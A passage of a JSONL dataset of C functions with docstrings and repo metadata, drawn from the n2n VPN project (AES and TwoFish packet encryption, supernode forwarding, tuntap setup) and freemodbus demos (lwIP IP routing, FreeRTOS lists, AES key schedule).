"n2n/n2n_v2/transform_aes.c", "commit_date": "2011-03-26 00:00:00", "repo_name": "meyerd/n2n", "stars": 875, "license": "None", "language": "c", "size": 508}
{"docstring": "/** Forward a L2 packet. This may involve a broadcast operation.\n *\n *  Rules are as follows:\n *\n *  1. If the dest MAC is a multicast address, broadcast to all edges in the\n *  community.\n *\n *  2. If the dest MAC is known forward to the destination edge only.\n *     Else broadcast to all edges in the community.\n *\n *  @return number of copies of the packet sent\n */\n", "func_signal": "static size_t forward_packet(char *packet, u_int packet_len, \n                             struct peer_addr *sender,\n                             n2n_sock_info_t * sinfo,\n                             struct n2n_packet_header *hdr )", "code": "{\n    size_t numsent=0;\n    u_int8_t is_dst_broad_multi_cast;\n    struct peer_info *scan;\n\n    ipstr_t buf;\n    ipstr_t buf1;\n\n    hdr->ttl++; /* FIX discard packets with a high TTL */\n    is_dst_broad_multi_cast = is_multi_broadcast(hdr->dst_mac);\n\n    /* Put the original packet sender (public) address */\n    memcpy(&hdr->public_ip, sender, sizeof(struct peer_addr));\n    hdr->sent_by_supernode = 1;\n\n    marshall_n2n_packet_header( (u_int8_t *)packet, hdr );\n\n\n    if ( is_dst_broad_multi_cast )\n    {\n        traceEvent(TRACE_INFO, \"Broadcasting. Multicast address [mac=%s]\",\n                   macaddr_str(hdr->dst_mac, buf, sizeof(buf)));\n\n        numsent = broadcast_packet( packet, packet_len, sender, sinfo, hdr );\n    }\n    else\n    {\n        scan = find_peer_by_mac( known_peers, hdr->dst_mac );\n        if ( scan )\n        {\n            int data_sent_len;\n            size_t len = packet_len;\n          \n            data_sent_len = send_data( &(scan->sinfo), packet, &len, &scan->public_ip, 0);\n\n            if(data_sent_len != len)\n            {\n                ++(supernode_stats.errors);\n                traceEvent(TRACE_WARNING, \"sendto() [sent=%d][attempted_to_send=%d] [%s]\\n\",\n                           data_sent_len, len, strerror(errno));\n            }\n            else {\n                ++(supernode_stats.pkts);\n                traceEvent(TRACE_INFO, \"Sent message to remote node [%s:%hu][mac=%s]\",\n                           intoa(ntohl(scan->public_ip.addr_type.v4_addr), buf, sizeof(buf)),\n                           ntohs(scan->public_ip.port),\n                           macaddr_str(scan->mac_addr, buf1, sizeof(buf1)));\n            }\n\n            numsent = 1;\n        }\n        else\n        {\n            traceEvent(TRACE_INFO, \"Broadcasting because unknown dest [mac=%s]\",\n                       macaddr_str(hdr->dst_mac, buf, sizeof(buf)));\n            numsent = broadcast_packet( packet, packet_len, sender, sinfo, hdr );\n        }\n    }\n\n    return numsent;\n}", "path": "n2n/n2n_v1/supernode.c", "commit_date": "2011-03-26 00:00:00", "repo_name": "meyerd/n2n", "stars": 875, "license": "None", "language": "c", "size": 508}
{"docstring": "/* Copy from base to out of size bufsize */\n", "func_signal": "int decode_buf( uint8_t * out,\n                size_t bufsize,\n                const uint8_t * base,\n                size_t * rem,\n                size_t * idx )", "code": "{\n    if (*rem < bufsize ) { return 0; }\n\n    memcpy( out, (base + *idx), bufsize );\n    *idx += bufsize;\n    *rem -= bufsize;\n    return bufsize;\n}", "path": "n2n/n2n_v2/wire.c", "commit_date": "2019-03-24 00:00:00", "repo_name": "meyerd/n2n", "stars": 875, "license": "None", "language": "c", "size": 508}
{"docstring": "/* en/decryption with CBC mode */\n", "func_signal": "uint32_t _TwoFish_CryptRawCBC(uint8_t *in,uint8_t *out,uint32_t len,bool decrypt,TWOFISH *tfdata)", "code": "{\tuint32_t rl;\n\n  rl=len;\t\t\t\t\t\t\t\t\t\t\t/* remember how much data to crypt. */\n  while(len>TwoFish_BLOCK_SIZE)\t\t\t\t\t/* and now we process block by block. */\n    {\t_TwoFish_BlockCrypt(in,out,TwoFish_BLOCK_SIZE,decrypt,tfdata); /* de/encrypt it. */\n      in+=TwoFish_BLOCK_SIZE;\t\t\t\t\t\t/* adjust pointers. */\n      out+=TwoFish_BLOCK_SIZE;\n      len-=TwoFish_BLOCK_SIZE;\n    }\n  if(len>0)\t\t\t\t\t\t\t\t\t\t/* if we have less than a block left... */\n    _TwoFish_BlockCrypt(in,out,len,decrypt,tfdata);\t/* ...then we de/encrypt that too. */\n  if(tfdata->qBlockDefined && !tfdata->dontflush)\t\t\t\t\t\t/* in case len was exactly one block... */\n    _TwoFish_FlushOutput(tfdata->qBlockCrypt,TwoFish_BLOCK_SIZE,tfdata); /* ...we need to write the...  */\n  /* ...remaining bytes of the buffer */\n  return rl;\n}", "path": "n2n/n2n_v2/twofish.c", "commit_date": "2011-03-26 00:00:00", "repo_name": "meyerd/n2n", "stars": 875, "license": "None", "language": "c", "size": 508}
{"docstring": "/** The aes packet format consists of:\n *\n *  - a 8-bit aes encoding version in clear text\n *  - a 32-bit SA number in clear text\n *  - ciphertext encrypted from a 32-bit nonce followed by the payload.\n *\n *  [V|SSSS|nnnnDDDDDDDDDDDDDDDDDDDDD]\n *         |<------ encrypted ------>|\n */\n", "func_signal": "static int transop_decode_aes( n2n_trans_op_t * arg,\n                                   uint8_t * outbuf,\n                                   size_t out_len,\n                                   const uint8_t * inbuf,\n                                   size_t in_len )", "code": "{\n    int len=0;\n    transop_aes_t * priv = (transop_aes_t *)arg->priv;\n    uint8_t assembly[N2N_PKT_BUF_SIZE];\n\n    if ( ( (in_len - (TRANSOP_AES_VER_SIZE + TRANSOP_AES_SA_SIZE)) <= N2N_PKT_BUF_SIZE ) /* Cipher text fits in assembly */ \n         && (in_len >= (TRANSOP_AES_VER_SIZE + TRANSOP_AES_SA_SIZE + TRANSOP_AES_NONCE_SIZE) ) /* Has at least version, SA and nonce */\n        )\n    {\n        n2n_sa_t sa_rx;\n        ssize_t sa_idx=-1;\n        size_t rem=in_len;\n        size_t idx=0;\n        uint8_t aes_enc_ver=0;\n\n        /* Get the encoding version to make sure it is supported */\n        decode_uint8( &aes_enc_ver, inbuf, &rem, &idx );\n\n        if ( N2N_AES_TRANSFORM_VERSION == aes_enc_ver )\n        {\n            /* Get the SA number and make sure we are decrypting with the right one. */\n            decode_uint32( &sa_rx, inbuf, &rem, &idx );\n\n            sa_idx = aes_find_sa(priv, sa_rx);\n            if ( sa_idx >= 0 )\n            {\n                sa_aes_t * sa = &(priv->sa[sa_idx]);\n\n                traceEvent( TRACE_DEBUG, \"decode_aes %lu with SA %lu.\", in_len, sa_rx, sa->sa_id );\n\n                len = (in_len - (TRANSOP_AES_VER_SIZE + TRANSOP_AES_SA_SIZE));\n                \n                if ( 0 == (len % AES_BLOCK_SIZE ) )\n                {\n                    uint8_t padding;\n\n                    memset( &(sa->dec_ivec), 0, sizeof(N2N_AES_IVEC_SIZE) );\n                    AES_cbc_encrypt( (inbuf + TRANSOP_AES_VER_SIZE + TRANSOP_AES_SA_SIZE),\n                                     assembly, /* destination */\n                                     len, \n                                     &(sa->dec_key),\n                                     sa->dec_ivec, 0 /* decrypt */ );\n\n                    /* last byte is how much was padding: max value should be\n                     * AES_BLOCKSIZE-1 */\n                    padding = assembly[ len-1 ] & 0xff; \n\n                    if ( len >= (padding + TRANSOP_AES_NONCE_SIZE))\n                    {\n                        /* strictly speaking for this to be an ethernet packet\n                         * it is going to need to be even bigger; but this is\n                         * enough to prevent segfaults. */\n                        traceEvent( TRACE_DEBUG, \"padding = %u\", padding );\n                        len -= padding;\n\n                        len -= TRANSOP_AES_NONCE_SIZE; /* size of ethernet packet */\n\n                        /* Step over 4-byte random nonce value */\n                        memcpy( outbuf, \n                                assembly + TRANSOP_AES_NONCE_SIZE, \n                                len );\n                    }\n                    else\n                    {\n                        traceEvent( TRACE_WARNING, \"UDP payload decryption failed.\" );\n                    }\n                }\n                else\n                {\n                    traceEvent( TRACE_WARNING, \"Encrypted length %d is not a multiple of AES_BLOCK_SIZE (%d)\", len, AES_BLOCK_SIZE );\n                    len = 0;\n                }\n\n            }\n            else\n            {\n                /* Wrong security association; drop the packet as it is undecodable. */\n                traceEvent( TRACE_ERROR, \"decode_aes SA number %lu not found.\", sa_rx );\n\n                /* REVISIT: should be able to load a new SA at this point to complete the decoding. */\n            }\n        }\n        else\n        {\n            /* Wrong security association; drop the packet as it is undecodable. */\n            traceEvent( TRACE_ERROR, \"decode_aes unsupported aes version %u.\", aes_enc_ver );\n\n            /* REVISIT: should be able to load a new SA at this point to complete the decoding. */\n        }        \n    }\n    else\n    {\n        traceEvent( TRACE_ERROR, \"decode_aes inbuf wrong size (%ul) to decrypt.\", in_len );\n    }\n\n    return len;\n}", "path": "n2n/n2n_v2/transform_aes.c", "commit_date": "2011-03-26 00:00:00", "repo_name": "meyerd/n2n", "stars": 875, "license": "None", "language": "c", "size": 508}
{"docstring": "/* en/decryption without reset of CBC and output assignment */\n", "func_signal": "uint32_t _TwoFish_CryptRaw(uint8_t *in,uint8_t *out,uint32_t len,bool decrypt,TWOFISH *tfdata)", "code": "{\n  if(in!=NULL && out!=NULL && len>0 && tfdata!=NULL)\t\t/* if we have valid data, then... */\n    {\tif(len>TwoFish_BLOCK_SIZE)\t\t\t\t\t\t\t/* ...check if we have more than one block. */\n\treturn _TwoFish_CryptRawCBC(in,out,len,decrypt,tfdata); /* if so, use the CBC routines... */\n      else\n\treturn _TwoFish_CryptRaw16(in,out,len,decrypt,tfdata); /* ...otherwise just do one block. */\n    }\n  return 0;\n}", "path": "n2n/n2n_v2/twofish.c", "commit_date": "2011-03-26 00:00:00", "repo_name": "meyerd/n2n", "stars": 875, "license": "None", "language": "c", "size": 508}
{"docstring": "/* Search through the array of SAs to find the one with the required ID.\n *\n * @return array index where found or -1 if not found\n */\n", "func_signal": "static ssize_t aes_find_sa( const transop_aes_t * priv, const n2n_sa_t req_id )", "code": "{\n    size_t i;\n    \n    for (i=0; i < priv->num_sa; ++i)\n    {\n        const sa_aes_t * sa=NULL;\n\n        sa = &(priv->sa[i]);\n        if (req_id == sa->sa_id)\n        {\n            return i;\n        }\n    }\n\n    return -1;\n}", "path": "n2n/n2n_v2/transform_aes.c", "commit_date": "2011-03-26 00:00:00", "repo_name": "meyerd/n2n", "stars": 875, "license": "None", "language": "c", "size": 508}
{"docstring": "/*\tTwoFish Raw Encryption\n *\n *\tDoes not use header, but does use CBC (if more than one block has to be encrypted).\n *\n *\tInput:\tPointer to the buffer of the plaintext to be encrypted.\n *\t\t\tPointer to the buffer receiving the ciphertext.\n *\t\t\tThe length of the plaintext buffer.\n *\t\t\tThe TwoFish structure.\n *\n *\tOutput:\tThe amount of bytes encrypted if successful, otherwise 0.\n */\n", "func_signal": "uint32_t TwoFishEncryptRaw(uint8_t *in,\n\t\t\t    uint8_t *out,\n\t\t\t    uint32_t len,\n\t\t\t    TWOFISH *tfdata)", "code": "{\t_TwoFish_ResetCBC(tfdata);\t\t\t\t\t\t\t/* reset CBC flag. */\n  tfdata->output=out;\t\t\t\t\t\t\t/* output straight into output buffer. */\n  return _TwoFish_CryptRaw(in,out,len,FALSE,tfdata);\t/* and go for it. */\n}", "path": "n2n/n2n_v2/twofish.c", "commit_date": "2011-03-26 00:00:00", "repo_name": "meyerd/n2n", "stars": 875, "license": "None", "language": "c", "size": 508}
{"docstring": "/* bin2hex and hex2bin conversion */\n", "func_signal": "void _TwoFish_BinHex(uint8_t *buf,uint32_t len,bool bintohex)", "code": "{\tuint8_t *pi,*po,c;\n\n  if(bintohex)\n    {\tfor(pi=buf+len-1,po=buf+(2*len)-1;len>0;pi--,po--,len--) /* let's start from the end of the bin block. */\n\t{\tc=*pi;\t\t\t\t\t\t\t\t\t\t\t\t /* grab value. */\n\t  c&=15;\t\t\t\t\t\t\t\t\t\t\t\t /* use lower 4 bits. */\n\t  if(c>9)\t\t\t\t\t\t\t\t\t\t\t\t /* convert to ascii. */\n\t    c+=('a'-10);\n\t  else\n\t    c+='0';\n\t  *po--=c;\t\t\t\t\t\t\t\t\t\t\t /* set the lower nibble. */\n\t  c=*pi;\t\t\t\t\t\t\t\t\t\t\t\t /* grab value again. */\n\t  c>>=4;\t\t\t\t\t\t\t\t\t\t\t\t /* right shift 4 bits. */\n\t  c&=15;\t\t\t\t\t\t\t\t\t\t\t\t /* make sure we only have 4 bits. */\n\t  if(c>9)\t\t\t\t\t\t\t\t\t\t\t\t /* convert to ascii. */\n\t    c+=('a'-10);\n\t  else\n\t    c+='0';\n\t  *po=c;\t\t\t\t\t\t\t\t\t\t\t\t /* set the higher nibble. */\n\t}\t\t\t\t\t\t\t\t\t\t\t\t\t\t /* and keep going. */\n    }\n  else\n    {\tfor(pi=buf,po=buf;len>0;pi++,po++,len-=2)\t\t\t\t /* let's start from the beginning of the hex block. */\n\t{\tc=tolower(*pi++)-'0';\t\t\t\t\t\t\t\t /* grab higher nibble. */\n\t  if(c>9)\t\t\t\t\t\t\t\t\t\t\t\t /* convert to value. */\n\t    c-=('0'-9);\n\t  *po=c<<4;\t\t\t\t\t\t\t\t\t\t\t /* left shit 4 bits. */\n\t  c=tolower(*pi)-'0';\t\t\t\t\t\t\t\t\t /* grab lower nibble. */\n\t  if(c>9)\t\t\t\t\t\t\t\t\t\t\t\t /* convert to value. */\n\t    c-=('0'-9);\n\t  *po|=c;\t\t\t\t\t\t\t\t\t\t\t\t /* and add to value. */\n\t}\n    }\n}", "path": "n2n/n2n_v2/twofish.c", "commit_date": "2011-03-26 00:00:00", "repo_name": "meyerd/n2n", "stars": 875, "license": "None", "language": "c", "size": 508}
{"docstring": "/*\tTwoFish Alloc\n *\n *\tAllocates enough memory for the output buffer that would be required\n *\n *\tInput:\tLength of the plaintext.\n *\t\t\tBoolean flag for BinHex Output.\n *\t\t\tPointer to the TwoFish structure.\n *\n *\tOutput:\tReturns a pointer to the memory allocated.\n */\n", "func_signal": "void *TwoFishAlloc(uint32_t len,bool binhex,bool decrypt,TWOFISH *tfdata)", "code": "{\n  /*\tTwoFishFree(tfdata);\t*/\t\t\t/* (don't for now) discard whatever was allocated earlier. */\n  if(decrypt)\t\t\t\t\t\t\t/* if decrypting... */\n    {\tif(binhex)\t\t\t\t\t\t/* ...and input is binhex encoded... */\n\tlen/=2;\t\t\t\t\t\t/* ...use half as much for output. */\n      len-=TwoFish_BLOCK_SIZE;\t\t/* Also, subtract the size of the header. */\n    }\n  else\n    {\tlen+=TwoFish_BLOCK_SIZE;\t\t/* the size is just increased by the header... */\n      if(binhex)\n\tlen*=2;\t\t\t\t\t\t/* ...and doubled if output is to be binhexed. */\n    }\n  tfdata->output=malloc(len+TwoFish_BLOCK_SIZE);/* grab some memory...plus some extra (it's running over somewhere, crashes without extra padding) */\n\n  return tfdata->output;\t\t\t\t/* ...and return to caller. */\n}", "path": "n2n/n2n_v2/twofish.c", "commit_date": "2011-03-26 00:00:00", "repo_name": "meyerd/n2n", "stars": 875, "license": "None", "language": "c", "size": 508}
{"docstring": "/* Fill out the ip_addr value from the interface. Called to pick up dynamic\n * address changes. */\n", "func_signal": "void tuntap_get_address(struct tuntap_dev *tuntap)", "code": "{\n    FILE * fp=NULL;\n    char buf[N2N_LINUX_SYSTEMCMD_SIZE];\n\n    /* Would rather have a more direct way to get the inet address but a netlink\n     * socket is overkill and probably less portable than ifconfig and sed. */\n\n    /* If the interface has no address (0.0.0.0) there will be no inet addr\n     * line and the returned string will be empty. */\n    snprintf( buf, sizeof(buf), \"/sbin/ifconfig %s | /bin/sed -e '/inet addr:/!d' -e 's/^.*inet addr://' -e 's/ .*$//'\",\n              tuntap->dev_name );\n    fp=popen(buf, \"r\");\n    if (fp)\n    {\n        memset(buf,0,N2N_LINUX_SYSTEMCMD_SIZE); /* make sure buf is NULL terminated. */\n        fread(buf, 1, 15, fp);\n        pclose(fp);\n        fp=NULL;\n\n        traceEvent(TRACE_INFO, \"ifconfig address = %s\", buf);\n\n        tuntap->ip_addr = inet_addr(buf);\n    }\n}", "path": "n2n/n2n_v2/tuntap_linux.c", "commit_date": "2018-08-08 00:00:00", "repo_name": "meyerd/n2n", "stars": 875, "license": "None", "language": "c", "size": 508}
{"docstring": "/*\tTwoFish Free\n *\n *\tFree's the allocated buffer.\n *\n *\tInput:\tPointer to the TwoFish structure\n *\n *\tOutput:\t(none)\n */\n", "func_signal": "void TwoFishFree(TWOFISH *tfdata)", "code": "{\tif(tfdata->output!=NULL)\t/* if a valid buffer is present... */\n    {\tfree(tfdata->output);\t/* ...then we free it for you... */\n      tfdata->output=NULL;\t/* ...and mark as such. */\n    }\n}", "path": "n2n/n2n_v2/twofish.c", "commit_date": "2011-03-26 00:00:00", "repo_name": "meyerd/n2n", "stars": 875, "license": "None", "language": "c", "size": 508}
{"docstring": "/**\n * Use (12, 8) Reed-Solomon code over GF(256) to produce a key S-box\n * 32-bit entity from two key material 32-bit entities.\n *\n * @param  k0  1st 32-bit entity.\n * @param  k1  2nd 32-bit entity.\n * @return  Remainder polynomial generated using RS code\n */\n", "func_signal": "uint32_t _TwoFish_RS_MDS_Encode(uint32_t k0,uint32_t k1)", "code": "{\tuint32_t i,r;\n\n  for(r=k1,i=0;i<4;i++) /* shift 1 byte at a time */\n    TwoFish_RS_rem(r);\n  r ^= k0;\n  for(i=0;i<4;i++)\n    TwoFish_RS_rem(r);\n\n  return r;\n}", "path": "n2n/n2n_v2/twofish.c", "commit_date": "2011-03-26 00:00:00", "repo_name": "meyerd/n2n", "stars": 875, "license": "None", "language": "c", "size": 508}
{"docstring": "/* en/decryption on one block only */\n", "func_signal": "uint32_t _TwoFish_CryptRaw16(uint8_t *in,uint8_t *out,uint32_t len,bool decrypt,TWOFISH *tfdata)", "code": "{\t/* qBlockPlain already zero'ed through ResetCBC  */\n  memcpy(tfdata->qBlockPlain,in,len);\t\t\t\t\t/* toss the data into it. */\n  _TwoFish_BlockCrypt16(tfdata->qBlockPlain,tfdata->qBlockCrypt,decrypt,tfdata); /* encrypt just that block without CBC. */\n  memcpy(out,tfdata->qBlockCrypt,TwoFish_BLOCK_SIZE);\t\t\t\t/* and return what we got */\n  return TwoFish_BLOCK_SIZE;\n}", "path": "n2n/n2n_v2/twofish.c", "commit_date": "2011-03-26 00:00:00", "repo_name": "meyerd/n2n", "stars": 875, "license": "None", "language": "c", "size": 508}
{"docstring": "/*\tTwoFish Initialization\n *\n *\tThis routine generates a global data structure for use with TwoFish,\n *\tinitializes important values (such as subkeys, sBoxes), generates subkeys\n *\tand precomputes the MDS matrix if not already done.\n *\n *\tInput:\tUser supplied password (will be appended by default password of 'SnortHas2FishEncryptionRoutines!')\n *\n *      Output: Pointer to TWOFISH structure. This data structure contains key dependent data.\n *\t\tThis pointer is used with all other crypt functions.\n */\n", "func_signal": "TWOFISH *TwoFishInit(const uint8_t *userkey, uint32_t keysize)", "code": "{  TWOFISH *tfdata;\n  int i,x,m;\n  uint8_t tkey[TwoFish_KEY_LENGTH+40];\n\n  memset( tkey, 0, TwoFish_KEY_LENGTH+40 );\n  tfdata=(TWOFISH *)malloc(sizeof(TWOFISH));\t\t\t/* allocate the TwoFish structure */\n  if(tfdata!=NULL)\n  {\n\n      /* Changes here prevented a dangerous random key segment for keys of length < TwoFish_KEY_LENGTH */\n      if(keysize > 0)\n      {\n          memcpy( tkey, userkey, keysize ); /* The rest will be zeros */\n      }\n      else\n      {\n          memcpy( tkey, TwoFish_DEFAULT_PW, TwoFish_DEFAULT_PW_LEN ); /* if no key defined, use default password */\n      }\n\n      /* This loop is awful - surely a loop on memcpy() would be clearer and more efficient */\n      for(i=0,x=0,m=keysize;i<TwoFish_KEY_LENGTH;i++)\t/* copy into data structure */\n      {\n          tfdata->key[i]=tkey[x++];\t\t\t/* fill the whole keyspace with repeating key. */\n          if(x==m)\n              x=0;\n      }\n\n      if(!TwoFish_MDSready)\n          _TwoFish_PrecomputeMDSmatrix();\t\t/* \"Wake Up, Neo\" */\n      _TwoFish_MakeSubKeys(tfdata);\t\t\t/* generate subkeys */\n      _TwoFish_ResetCBC(tfdata);\t\t\t/* reset the CBC */\n      tfdata->output=NULL;\t\t\t\t/* nothing to output yet */\n      tfdata->dontflush=FALSE;\t\t\t\t/* reset decrypt skip block flag */\n      if(TwoFish_srand)\n      {\n          TwoFish_srand=FALSE;\n          /* REVISIT: BbMaj7 : Should choose something with less predictability\n           * particularly for embedded targets with no real-time clock. */\n          srand((unsigned int)time(NULL)); \n      }\n  }\n  return tfdata;\t\t\t\t\t/* return the data pointer */\n}", "path": "n2n/n2n_v2/twofish.c", "commit_date": "2011-03-26 00:00:00", "repo_name": "meyerd/n2n", "stars": 875, "license": "None", "language": "c", "size": 508}
{"docstring": "/* Return the best acceptable AES key size (in bytes) given an input keysize. \n *\n * The value returned will be one of AES128_KEY_BYTES, AES192_KEY_BYTES or\n * AES256_KEY_BYTES.\n */\n", "func_signal": "static size_t aes_best_keysize(size_t numBytes)", "code": "{\n    if (numBytes >= AES256_KEY_BYTES )\n    {\n        return AES256_KEY_BYTES;\n    }\n    else if (numBytes >= AES192_KEY_BYTES)\n    {\n        return AES192_KEY_BYTES;\n    }\n    else\n    {\n        return AES128_KEY_BYTES;\n    }\n}", "path": "n2n/n2n_v2/transform_aes.c", "commit_date": "2011-03-26 00:00:00", "repo_name": "meyerd/n2n", "stars": 875, "license": "None", "language": "c", "size": 508}
{"docstring": "/**\n * Finds the appropriate network interface for a given IP address. It\n * searches the list of network interfaces linearly. A match is found\n * if the masked IP address of the network interface equals the masked\n * IP address given to the function.\n */\n", "func_signal": "struct netif *\nip_route(struct ip_addr *dest)", "code": "{\n  struct netif *netif;\n\n  /* iterate through netifs */\n  for(netif = netif_list; netif != NULL; netif = netif->next) {\n    /* network mask matches? */\n    if (ip_addr_netcmp(dest, &(netif->ip_addr), &(netif->netmask))) {\n      /* return netif on which to forward IP packet */\n      return netif;\n    }\n  }\n  /* no matching netif found, use default netif */\n  return netif_default;\n}", "path": "freemodbus/demo/STR71XTCP/lwip/src/core/ipv4/ip.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "cwalter-at/freemodbus", "stars": 659, "license": "None", "language": "c", "size": 2769}
{"docstring": "/**\n * Forwards an IP packet. It finds an appropriate route for the\n * packet, decrements the TTL value of the packet, adjusts the\n * checksum and outputs the packet on the appropriate interface.\n */\n", "func_signal": "static struct netif *\nip_forward(struct pbuf *p, struct ip_hdr *iphdr, struct netif *inp)", "code": "{\n  struct netif *netif;\n\n  PERF_START;\n  /* Find network interface where to forward this IP packet to. */\n  netif = ip_route((struct ip_addr *)&(iphdr->dest));\n  if (netif == NULL) {\n    LWIP_DEBUGF(IP_DEBUG, (\"ip_forward: no forwarding route for 0x%\"X32_F\" found\\n\",\n                      iphdr->dest.addr));\n    snmp_inc_ipnoroutes();\n    return (struct netif *)NULL;\n  }\n  /* Do not forward packets onto the same network interface on which\n   * they arrived. */\n  if (netif == inp) {\n    LWIP_DEBUGF(IP_DEBUG, (\"ip_forward: not bouncing packets back on incoming interface.\\n\"));\n    snmp_inc_ipnoroutes();\n    return (struct netif *)NULL;\n  }\n\n  /* decrement TTL */\n  IPH_TTL_SET(iphdr, IPH_TTL(iphdr) - 1);\n  /* send ICMP if TTL == 0 */\n  if (IPH_TTL(iphdr) == 0) {\n    /* Don't send ICMP messages in response to ICMP messages */\n    if (IPH_PROTO(iphdr) != IP_PROTO_ICMP) {\n      icmp_time_exceeded(p, ICMP_TE_TTL);\n      snmp_inc_icmpouttimeexcds();\n    }\n    return (struct netif *)NULL;\n  }\n\n  /* Incrementally update the IP checksum. */\n  if (IPH_CHKSUM(iphdr) >= htons(0xffff - 0x100)) {\n    IPH_CHKSUM_SET(iphdr, IPH_CHKSUM(iphdr) + htons(0x100) + 1);\n  } else {\n    IPH_CHKSUM_SET(iphdr, IPH_CHKSUM(iphdr) + htons(0x100));\n  }\n\n  LWIP_DEBUGF(IP_DEBUG, (\"ip_forward: forwarding packet to 0x%\"X32_F\"\\n\",\n                    iphdr->dest.addr));\n\n  IP_STATS_INC(ip.fw);\n  IP_STATS_INC(ip.xmit);\n    snmp_inc_ipforwdatagrams();\n\n  PERF_STOP(\"ip_forward\");\n  /* transmit pbuf on chosen interface */\n  netif->output(netif, p, (struct ip_addr *)&(iphdr->dest));\n  return netif;\n}", "path": "freemodbus/demo/STR71XTCP/lwip/src/core/ipv4/ip.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "cwalter-at/freemodbus", "stars": 659, "license": "None", "language": "c", "size": 2769}
{"docstring": "/**\n * Sends an IP packet on a network interface. This function constructs\n * the IP header and calculates the IP header checksum. If the source\n * IP address is NULL, the IP address of the outgoing network\n * interface is filled in as source address.\n */\n", "func_signal": "err_t\nip_output_if(struct pbuf *p, struct ip_addr *src, struct ip_addr *dest,\n             u8_t ttl, u8_t tos,\n             u8_t proto, struct netif *netif)", "code": "{\n  struct ip_hdr *iphdr;\n  u16_t ip_id = 0;\n\n  snmp_inc_ipoutrequests();\n\n  if (dest != IP_HDRINCL) {\n    if (pbuf_header(p, IP_HLEN)) {\n      LWIP_DEBUGF(IP_DEBUG | 2, (\"ip_output: not enough room for IP header in pbuf\\n\"));\n\n      IP_STATS_INC(ip.err);\n      snmp_inc_ipoutdiscards();\n      return ERR_BUF;\n    }\n\n    iphdr = p->payload;\n\n    IPH_TTL_SET(iphdr, ttl);\n    IPH_PROTO_SET(iphdr, proto);\n\n    ip_addr_set(&(iphdr->dest), dest);\n\n    IPH_VHLTOS_SET(iphdr, 4, IP_HLEN / 4, tos);\n    IPH_LEN_SET(iphdr, htons(p->tot_len));\n    IPH_OFFSET_SET(iphdr, htons(IP_DF));\n    IPH_ID_SET(iphdr, htons(ip_id));\n    ++ip_id;\n\n    if (ip_addr_isany(src)) {\n      ip_addr_set(&(iphdr->src), &(netif->ip_addr));\n    } else {\n      ip_addr_set(&(iphdr->src), src);\n    }\n\n    IPH_CHKSUM_SET(iphdr, 0);\n#if CHECKSUM_GEN_IP\n    IPH_CHKSUM_SET(iphdr, inet_chksum(iphdr, IP_HLEN));\n#endif\n  } else {\n    iphdr = p->payload;\n    dest = &(iphdr->dest);\n  }\n\n#if IP_FRAG\n  /* don't fragment if interface has mtu set to 0 [loopif] */\n  if (netif->mtu && (p->tot_len > netif->mtu))\n    return ip_frag(p,netif,dest);\n#endif\n\n  IP_STATS_INC(ip.xmit);\n\n  LWIP_DEBUGF(IP_DEBUG, (\"ip_output_if: %c%c%\"U16_F\"\\n\", netif->name[0], netif->name[1], netif->num));\n  ip_debug_print(p);\n\n  LWIP_DEBUGF(IP_DEBUG, (\"netif->output()\"));\n\n  return netif->output(netif, p, dest);\n}", "path": "freemodbus/demo/STR71XTCP/lwip/src/core/ipv4/ip.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "cwalter-at/freemodbus", "stars": 659, "license": "None", "language": "c", "size": 2769}
{"docstring": "/*-----------------------------------------------------------\n * PUBLIC LIST API documented in list.h\n *----------------------------------------------------------*/\n", "func_signal": "void vListInitialise( xList *pxList )", "code": "{\n\t/* The list structure contains a list item which is used to mark the\n\tend of the list.  To initialise the list the list end is inserted\n\tas the only list entry. */\n\tpxList->pxIndex = ( xListItem * ) &( pxList->xListEnd );\n\n\t/* The list end value is the highest possible value in the list to\n\tensure it remains at the end of the list. */\n\tpxList->xListEnd.xItemValue = portMAX_DELAY;\n\n\t/* The list end next and previous pointers point to itself so we know\n\twhen the list is empty. */\n\tpxList->xListEnd.pxNext = ( xListItem * ) &( pxList->xListEnd );\n\tpxList->xListEnd.pxPrevious = ( xListItem * ) &( pxList->xListEnd );\n\n\tpxList->uxNumberOfItems = 0;\n}", "path": "freemodbus/demo/MCF5235CW/freertos/list.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "cwalter-at/freemodbus", "stars": 659, "license": "None", "language": "c", "size": 2769}
{"docstring": "//------------------------------------------------------------------------------\n/// Cleanup the AES algorithm\n//------------------------------------------------------------------------------\n", "func_signal": "void aes_ref_cleanup(void)", "code": "{\n    TRACE_DEBUG(\"AES/REF: Cleaning up ...\\n\\r\");\n    TRACE_DEBUG(\"AES/REF: Cleanup done.\\n\\r\");\n}", "path": "freemodbus/demo/ATSAM3S/libraries/drivers/utility/encryption/aes_reference.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "cwalter-at/freemodbus", "stars": 659, "license": "None", "language": "c", "size": 2769}
{"docstring": "//------------------------------------------------------------------------------\n/// Performs the AES key schedule\n/// \\param Key to use\n/// \\param Buffer to store expanded key schedule\n//------------------------------------------------------------------------------\n", "func_signal": "static inline void keySchedule(unsigned char k[KC][4], unsigned char W[ROUNDS+1][BC][4])", "code": "{\n    int t;\n    int rconpointer = 0;\n    unsigned int j;\n    unsigned char tk[KC][4];\n\n    for(j=0; j < KC; j++) {\n        ((int *) tk)[j] = ((int *) k)[j];\n    }\n  \n    t = 0;\n    /* copy values into round key array */\n    for(j=0; (j < KC) && (t < (ROUNDS+1)*BC); j++, t++) {\n        ((int *) W[t / BC])[t%BC] = ((int *) tk)[j];\n    }\n  \n    while (t < (ROUNDS+1)*BC) { \n\n        tk[0][0] ^= S[tk[KC-1][1]] ^ rcon[rconpointer++];\n        tk[0][1] ^= S[tk[KC-1][2]];\n        tk[0][2] ^= S[tk[KC-1][3]];\n        tk[0][3] ^= S[tk[KC-1][0]];\n\n        if (KC != 8) {\n            for(j=1; j < KC; j++) {\n                ((int *) tk)[j] ^= ((int *) tk)[j-1];\n            }\n        }\n        else {\n            for(j=1; j < KC/2; j++) {\n                ((int *) tk)[j] ^= ((int *) tk)[j-1];\n            }\n            tk[KC/2][0] ^= S[tk[KC/2 - 1][0]];\n            tk[KC/2][1] ^= S[tk[KC/2 - 1][1]];\n            tk[KC/2][2] ^= S[tk[KC/2 - 1][2]];\n            tk[KC/2][3] ^= S[tk[KC/2 - 1][3]];\n\n            for(j=KC/2+1; j < KC; j++) {\n                ((int *) tk)[j] ^= ((int *) tk)[j-1];\n            }\n        }\n\n        // copy values into round key array\n        for(j=0; (j < KC) && (t < 